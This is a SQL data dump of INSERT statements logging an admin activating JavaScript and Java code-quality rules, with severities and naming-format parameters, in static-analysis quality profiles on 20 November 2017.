INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (585, '2017-11-20 07:13:48.472', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2999;ruleKey=javascript:S2999;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;param_considerJSDoc=false;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqG4bbGRdfPp-qms');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (586, '2017-11-20 07:13:48.521', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S3001;ruleKey=javascript:S3001;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqHpbbGRdfPp-qmt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (587, '2017-11-20 07:13:48.567', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S3002;ruleKey=javascript:S3002;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqIXbbGRdfPp-qmu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (588, '2017-11-20 07:13:48.616', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S3271;ruleKey=javascript:S3271;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqJIbbGRdfPp-qmv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (589, '2017-11-20 07:13:48.668', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S3403;ruleKey=javascript:S3403;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqJ8bbGRdfPp-qmw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (590, '2017-11-20 07:13:48.72', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S3500;ruleKey=javascript:S3500;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqKwbbGRdfPp-qmx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (591, '2017-11-20 07:13:48.758', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S905;ruleKey=javascript:S905;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqLWbbGRdfPp-qmy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (592, '2017-11-20 07:13:48.838', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:TrailingComma;ruleKey=javascript:TrailingComma;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqMmbbGRdfPp-qmz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (593, '2017-11-20 07:13:48.914', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:WithStatement;ruleKey=javascript:WithStatement;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqNybbGRdfPp-qm0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (594, '2017-11-20 07:28:33.116', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCFcbbGRdfPp-qm1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (595, '2017-11-20 07:28:33.198', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCGubbGRdfPp-qm2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (596, '2017-11-20 07:28:33.301', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCIVbbGRdfPp-qm3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (597, '2017-11-20 07:28:33.346', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCJCbbGRdfPp-qm4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (598, '2017-11-20 07:28:33.391', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCJvbbGRdfPp-qm5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (599, '2017-11-20 07:28:33.448', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCKobbGRdfPp-qm6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (600, '2017-11-20 07:28:33.484', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCLMbbGRdfPp-qm7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (601, '2017-11-20 07:28:33.538', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCMCbbGRdfPp-qm8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (602, '2017-11-20 07:28:33.586', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCMybbGRdfPp-qm9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (603, '2017-11-20 07:28:33.649', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCNxbbGRdfPp-qm-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (604, '2017-11-20 07:28:33.7', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCOkbbGRdfPp-qm_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (605, '2017-11-20 07:28:33.76', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCPgbbGRdfPp-qnA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (606, '2017-11-20 07:28:33.816', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCQXbbGRdfPp-qnB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (607, '2017-11-20 07:28:33.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCRsbbGRdfPp-qnC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (608, '2017-11-20 07:28:33.932', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCSMbbGRdfPp-qnD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (609, '2017-11-20 07:28:33.971', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCSzbbGRdfPp-qnE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (610, '2017-11-20 07:28:34.021', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCTlbbGRdfPp-qnF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (611, '2017-11-20 07:28:34.142', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCVebbGRdfPp-qnG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (612, '2017-11-20 07:28:34.279', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCXnbbGRdfPp-qnH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (613, '2017-11-20 07:28:34.379', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCZLbbGRdfPp-qnI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (614, '2017-11-20 07:28:34.421', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCZ1bbGRdfPp-qnJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (615, '2017-11-20 07:28:34.462', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCaebbGRdfPp-qnK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (616, '2017-11-20 07:28:34.498', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCbCbbGRdfPp-qnL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (617, '2017-11-20 07:28:34.549', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCb1bbGRdfPp-qnM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (618, '2017-11-20 07:28:34.602', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCcqbbGRdfPp-qnN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (619, '2017-11-20 07:28:34.66', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCdkbbGRdfPp-qnO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (620, '2017-11-20 07:28:34.706', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCeSbbGRdfPp-qnP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (621, '2017-11-20 07:28:34.755', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCfDbbGRdfPp-qnQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (622, '2017-11-20 07:28:34.821', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCgFbbGRdfPp-qnR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (623, '2017-11-20 07:28:34.857', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCgpbbGRdfPp-qnS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (624, '2017-11-20 07:28:34.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCiAbbGRdfPp-qnT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (625, '2017-11-20 07:28:35.009', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCjBbbGRdfPp-qnU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (626, '2017-11-20 07:28:35.071', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCj_bbGRdfPp-qnV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (627, '2017-11-20 07:28:35.11', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCkmbbGRdfPp-qnW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (628, '2017-11-20 07:28:35.151', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVClPbbGRdfPp-qnX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (629, '2017-11-20 07:28:35.206', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCmGbbGRdfPp-qnY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (630, '2017-11-20 07:28:35.243', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCmrbbGRdfPp-qnZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (631, '2017-11-20 07:28:35.281', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCnRbbGRdfPp-qna');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (632, '2017-11-20 07:28:35.38', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCo0bbGRdfPp-qnb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (633, '2017-11-20 07:28:35.432', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCpobbGRdfPp-qnc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (634, '2017-11-20 07:28:35.479', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCqXbbGRdfPp-qnd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1218, '2017-11-20 10:14:43.662', 'admin', 'key=java-lena-qp_15-78480:squid:S1148;ruleKey=squid:S1148;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ETObbGRdfPp-qwl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (635, '2017-11-20 07:28:35.53', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCrKbbGRdfPp-qne');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (636, '2017-11-20 07:28:35.567', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCrvbbGRdfPp-qnf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (637, '2017-11-20 07:28:35.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCshbbGRdfPp-qng');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (638, '2017-11-20 07:28:35.652', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCtEbbGRdfPp-qnh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (639, '2017-11-20 07:28:35.697', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCtxbbGRdfPp-qni');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (640, '2017-11-20 07:28:35.75', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCumbbGRdfPp-qnj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (641, '2017-11-20 07:28:35.801', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCvZbbGRdfPp-qnk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (642, '2017-11-20 07:28:35.854', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCwObbGRdfPp-qnl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (643, '2017-11-20 07:28:35.921', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCxRbbGRdfPp-qnm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (644, '2017-11-20 07:28:36.009', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVCypbbGRdfPp-qnn');
